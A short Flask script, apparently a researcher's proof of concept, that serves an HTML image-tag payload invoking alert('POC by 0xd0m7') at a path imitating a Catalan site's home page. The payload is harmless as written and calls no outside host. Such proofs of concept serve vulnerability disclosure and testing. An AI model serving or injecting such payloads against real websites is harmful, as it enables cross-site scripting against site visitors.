from flask import Flask
app = Flask(__name__)

@app.route("/ca/inici/index.html")
def poc():
  message = '<img/src=alert("POC by 0xd0m7")>'
  return message
